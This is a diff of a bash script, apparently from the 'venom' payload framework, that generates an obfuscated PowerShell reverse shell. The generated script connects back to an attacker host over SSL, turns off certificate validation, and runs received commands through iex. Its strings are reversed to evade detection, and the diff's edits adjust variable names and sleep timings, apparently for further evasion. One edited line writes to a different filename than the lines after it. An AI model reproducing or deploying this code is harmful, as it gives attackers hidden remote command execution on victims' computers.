@@ -13891,16 +13891,17 @@ SysCall2=$(cat /dev/urandom | tr -dc 'a-zA-Z' | head -c $Length2)
 syscallvar2="\$$SysCall2"
 
 echo "${BlueF}[☠]${white} Writting OpenSSL reverse shell to output."${Reset};sleep 2
-echo "<#" > $IPATH/output/Client.ps1
-echo "Obfuscated Reverse OpenSSL Shell" >> $IPATH/output/Client.ps1
+echo "<#" > $IPATH/output/$NaM.ps1
+echo "Obfuscated Reverse TCP OpenSSL Shell" >> $IPATH/output/Client.ps1
 echo "Framework: venom v1.0.17 - shinigami" >> $IPATH/output/Client.ps1
 echo "#>" >> $IPATH/output/Client.ps1
 echo "" >> $IPATH/output/Client.ps1
-echo "Start-Sleep -Milliseconds 300" >> $IPATH/output/Client.ps1
-echo "\$Waudt = \"tneilCpcT.stekcoS.teN\";\$Bin = \$Waudt.ToCharArray();[Array]::Reverse(\$Bin);" >> $IPATH/output/Client.ps1
-echo "$syscallvar = (\$Bin -Join '');\$Microphone = \"gnidocnEiicsA.txeT.metsyS\";\$CharArray = \$Microphone.ToCharArray();" >> $IPATH/output/Client.ps1
+echo "Start-Sleep -Milliseconds 150" >> $IPATH/output/Client.ps1
+echo "\$Vault = \"tneilCpcT.stekcoS.teN\";\$Certificate = \$Vault.ToCharArray();[Array]::Reverse(\$Certificate);" >> $IPATH/output/Client.ps1
+echo "$syscallvar = (\$Certificate -Join '');\$tls64 = \"gnidocnEiicsA.txeT.metsyS\";\$CharArray = \$tls64.ToCharArray();" >> $IPATH/output/Client.ps1
 echo "[Array]::Reverse(\$CharArray);$syscallvar2 = (\$CharArray -Join '');" >> $IPATH/output/Client.ps1
 echo "" >> $IPATH/output/Client.ps1
+echo "Start-Sleep -Milliseconds 250" >> $IPATH/output/Client.ps1
 echo "\$socket = New-Object $syscallvar('$lhost', $lport)" >> $IPATH/output/Client.ps1
 echo "\$stream = \$socket.GetStream()" >> $IPATH/output/Client.ps1
 echo "\$sslStream = New-Object System.Net.Security.SslStream(\$stream,\$false,({\$True} -as [Net.Security.RemoteCertificateValidationCallback]))" >> $IPATH/output/Client.ps1
@@ -13910,7 +13911,6 @@ echo "        \$writer.Write('[' + (hostname) + '] ' + (pwd).Path + '> ')" >> $I
 echo "        \$writer.flush()" >> $IPATH/output/Client.ps1
 echo "        [byte[]]\$bytes = 0..65535|%{0};" >> $IPATH/output/Client.ps1
 echo "" >> $IPATH/output/Client.ps1
-echo "Start-Sleep -Milliseconds 250" >> $IPATH/output/Client.ps1
 echo "while((\$i = \$sslStream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){" >> $IPATH/output/Client.ps1
 echo "   \$data = (New-Object -TypeName $syscallvar2).GetString(\$bytes,0, \$i);" >> $IPATH/output/Client.ps1
 echo "   \$sendback = (iex \$data | Out-String ) 2>&1;" >> $IPATH/output/Client.ps1
